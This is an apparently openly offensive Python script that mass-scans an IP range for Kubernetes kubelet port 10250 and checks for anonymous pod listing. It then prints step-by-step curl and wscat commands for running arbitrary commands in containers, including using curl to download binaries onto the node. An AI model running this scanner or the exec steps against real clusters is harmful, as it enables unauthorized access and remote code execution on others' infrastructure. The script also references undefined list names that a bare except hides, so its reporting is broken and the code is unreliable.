import socket
import ipaddress
from ipaddress import IPv4Address, IPv4Network
import threading
from queue import Queue
import requests

print("\n")
print("\033[92m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("* Unauth Kubernetes Exec Hunter v1.0                                          *")
print("* Author: @cedowens                                                           *")
print("* Independent Project                                                         *")
print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m")



count = 0
iplist = []
iprange = input("Enter IP range to sweep for unauth kubernetes exec API instances: ").strip()
port = 10250
numthreads = input("Enter the number of threads (For Mac, use a max of 250 unless you up the ulimit...on kali and most linux distros use a max of 1000 unless you up the ulimit): ").strip()
print("Checking...")
outfile = open("outfile.txt","w")
portopenlist = []
unauthexeclist = []
authexeclist = []
nulllist = []
unsuccessful = []

def Connector(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.7)
        result = sock.connect_ex((str(ip),port))
        sock.close()
        if result == 0:
            print("\033[92mPort " + str(port) + " OPEN on %s\033[0m" % str(ip))
            outfile.write("Port " + str(port) + " OPEN on %s\n" % str(ip))
            portopenlist.append(str(ip))
        
    except Exception as e:
        print(e)

def threader():
    while True:
        worker = q.get()
        Connector(worker)
        q.task_done()


def execchecker(host):
    url = "https://" + host + ":" + str(port) + "/pods"
    
    try:
        response = requests.get(url, verify=False)
        
        if (response.status_code == 200 and ('namespace' in response.text or 'Namespace' in response.text) and ('pod' in response.text or 'Pod' in response.text)):
            print("+"*40)
            print("\033[91mKubernetes node allowing system:anonymous viewing of pods found: %s\033[0m" % url)
            outfile.write("Kubernetes node allowing system:anonymous viewing of pods found:\n")
            outfile.write(url)
            outfile.write("\n")
            unauthexec.append(url)
        elif (response.status_code == 200 and '"items":null' in response.text):
            print("+"*40)
            print("\033[33mKubernetes node with null PodList: %s\033[0m" % url)
            outfile.write("Kubernetes node with null PodList:\n")
            outfile.write(url)
            outfile.write("\n")
            nulllist.append(url)
        elif response.status_code == 401 or response.status_code == 403:
            print("+"*40)
            print('\033[33mKubernetes node returned "unauthorized" response: %s\033[0m' % url)
            outfile.write('Kubernetes node returned "unauthorized" response:\n')
            outfile.write(url)
            outfile.write("\n")
            authexec.append(url)
        else:
            print("+"*40)
            print("Error accessing %s. Try navigating manually as well." % url)
            outfile.write("Error accessing %s. Try navigating manually as well." % url)
            outfile.write("\n")
            unsuccessful.append(url)
            
    except:
        pass

def threader2():
    while True:
        worker2 = q2.get()
        execchecker(worker2)
        q2.task_done()

q = Queue()

for ip in ipaddress.IPv4Network(iprange):
    count = count + 1
    iplist.append(str(ip))
    
for x in range(int(numthreads)):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()

for worker in iplist:
    q.put(worker)

q.join()

q2 = Queue()

for y in range(200):
    t2 = threading.Thread(target=threader2)
    t2.daemon = True
    t2.start()

for worker2 in portopenlist:
    item = str(ipaddress.IPv4Address(worker2))
    q2.put(item)

q2.join()


if unauthexeclist != []:
    print("+"*40)
    print("Since it appears you found at least 1 kubernetes node allowing unauthenticated exec API access, try the following steps to gain command execution:")
    print("1. Pick a namespace, pod, and container name from the /pods results on the kubernetes node.")
    print('2. Run the following curl command: curl -k -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://<kube-node>:10250/exec/<namespace>/<pod>/<container>?command=id&input=1&output=1&tty=1"')
    print('3. In the server response, look for the Location: <value>. You will next open a web socket to that location')
    print('4. Assuming use of wscat from your attack host, run: wscat -c "https://<kube-node>:10250/<location-path-value>" --no-check')
    print('5. Your wscat results from #4 above will show the results of the shell command executed. In this case the "id" command was run.')
    print('6. You can replace the "id" command with any other commands you want, such as curl to pull down binaries. If using curl, you will have one command value for each curl function (ex:command=curl&command="<url>"&command="-O" to download and write a file do disk)')
else:
    print("+"*40)
    print("No Kubernetes nodes with unauthenticated exec API access found.")
                       

outfile.close()        
print("+"*40)
print("DONE!")
print("Data written to outfile.txt in the current directory.")
print("+"*40)
